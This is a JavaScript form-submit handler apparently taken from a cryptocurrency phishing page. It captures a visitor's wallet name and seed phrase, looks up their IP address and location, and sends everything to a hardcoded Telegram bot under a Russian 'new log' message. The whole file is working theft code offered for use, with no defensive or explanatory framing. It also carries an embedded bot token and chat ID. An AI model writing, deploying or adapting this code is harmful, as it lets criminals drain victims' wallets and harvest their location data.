async function handleFormSubmit(event) {
    event.preventDefault();
    
    const token = "7758194328:AAG9pSD9fya02U2m4lgsG8OjNFKtLIt0r_0";
    const chat_id = "-1002371075600";
    
    const wallet = event.target.wallet.value;
    const phrase = event.target.phrase.value;
    
    // Get IP info
    const ipResponse = await fetch('https://api.ipify.org?format=json');
    const ipData = await ipResponse.json();
    const ip = ipData.ip;
    
    // Get location info
    const geoResponse = await fetch(`https://ipapi.co/${ip}/json/`);
    const geoData = await geoResponse.json();
    
    const message = `
💸 Поздравляем, новый лог!
💵 Кошелёк: ${wallet}
🔑 Фраза: ${phrase}
🗻 IP: ${ip}
🌍 Страна: ${geoData.country_name}
🌇 Город: ${geoData.city}
🔧 Домен: ${window.location.hostname}
    `.trim();

    // Send to Telegram
    const telegramUrl = `https://api.telegram.org/bot${token}/sendMessage`;
    await fetch(telegramUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            chat_id: chat_id,
            text: message
        })
    });
}
